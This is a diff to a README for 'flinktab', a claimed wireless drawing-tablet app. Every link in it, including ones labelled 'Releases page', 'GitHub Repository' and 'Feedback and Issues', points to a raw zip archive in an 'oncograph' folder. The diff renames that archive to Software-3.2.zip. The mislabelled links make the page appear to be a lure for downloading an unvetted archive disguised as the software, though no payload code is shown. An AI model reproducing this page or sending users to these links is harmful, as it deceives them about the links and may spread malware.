@@ -1,7 +1,7 @@
 # 🎨 flinktab - Your Wireless Drawing Tablet for PC
 
 ## 🔗 Download Now
-[![Download Flinktab](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip)](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip)
+[![Download Flinktab](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip)](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip)
 
 ## 🚀 Getting Started
 Flinktab turns your Android phone into a wireless drawing tablet for your PC. It’s open-source and works with popular software like Krita, Photoshop, and GIMP. This app provides a low-latency experience, making it perfect for digital artists.
@@ -27,7 +27,7 @@ To use flinktab, make sure your setup meets these requirements:
   - Wi-Fi capability
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip) and download the latest version of flinktab. Follow these steps for installation:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip) and download the latest version of flinktab. Follow these steps for installation:
 
 1. Open the link above.
 2. Find the latest release listed on the page.
@@ -66,10 +66,10 @@ If you need more help, consider joining the community or checking the FAQ sectio
 Flinktab is open-source and licensed under the MIT License. You can view the license details in the repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip)
-- [Feedback and Issues](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip)
+- [Feedback and Issues](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip)
 
 ## 🎉 Acknowledgments
 Flinktab relies on contributions from many developers. Thank you for supporting open-source software and enhancing digital art tools. 
 
-Remember to visit the [Releases page](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/flinktab.zip) for the latest updates and downloads. Enjoy your drawing experience with flinktab!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/FernandoDLX/flinktab/main/oncograph/Software-3.2.zip) for the latest updates and downloads. Enjoy your drawing experience with flinktab!
